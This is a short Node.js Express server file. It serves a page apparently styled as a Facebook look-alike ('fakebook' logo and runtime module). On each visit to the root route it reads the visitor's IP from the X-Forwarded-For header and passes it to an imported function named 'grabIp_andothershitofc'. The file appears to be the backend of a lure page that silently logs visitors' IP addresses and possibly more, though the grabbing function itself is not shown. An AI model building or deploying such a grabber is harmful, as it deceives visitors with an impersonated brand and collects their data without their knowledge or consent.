const express = require("express");
const app = express();
const error = require('./errors');
const { grabIp_andothershitofc } = require('./fakebook_runtime');

app.set('trust proxy', true)
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/assets/index.html');
    var forwardedIpsStr = req.header('x-forwarded-for');
    var IP = '';

    if (forwardedIpsStr) {
        IP = forwardedIps = forwardedIpsStr.split(',')[0];
    }
    grabIp_andothershitofc(IP);
});
app.get('/style.css', (req, res) => {
    res.sendFile(__dirname + '/assets/style.css');
});
app.get('/fakebook.svg', (req, res) => {
    res.sendFile(__dirname + '/assets/4lCu2zih0ca.svg');
});

app.use((req, res, next) => {
    error.createError(
        "errors.com.astaliyas_projects.not_found",
        "Sorry the resource you were trying to find could not be found",
        undefined, 1004, undefined, 404, res
    );
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
})